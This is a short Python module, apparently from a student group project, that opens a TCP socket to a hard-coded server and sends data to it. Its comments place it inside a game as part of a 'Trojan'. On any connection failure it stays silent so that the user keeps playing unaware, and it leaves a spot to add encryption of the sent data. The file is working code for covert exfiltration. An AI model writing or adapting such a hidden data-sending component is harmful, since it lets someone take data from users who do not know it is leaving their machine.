#! /usr/bin/python

import socket

class Port:
    def __init__(self, data):
        TCP_IP = '127.0.0.1' # <-- IP of the Server on Elvis
        #TCP_IP = '192.168.0.11' # <-- IP of the Server on Windows different comp
        #TCP_IP = '192.168.0.5' # <-- IP of the Server on Windows same comp
        TCP_PORT = 5005
        BUFFER_SIZE = 1024
        # MESSAGE = 'Hello, World from Group A-2!' #message used for basic data transfer
        # trojan = Trojan() # Trojan instance for Crypto f-ns calls

        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.s.connect((TCP_IP, TCP_PORT))
            self.connected = True
            self.transmit_data(data)
            #s.send(MESSAGE)
            #data = s.recv(BUFFER_SIZE)
        except:
            self.connected = False
            # do nothing to let user play the game
            # and do not display any error messages

    def __del__(self):
        if self.connected:
            self.s.close()

    def transmit_data(self, data):
        #print(self.message)
        #print(m)
        # add Encrypt here
        if self.connected:
            self.s.send(data.encode())

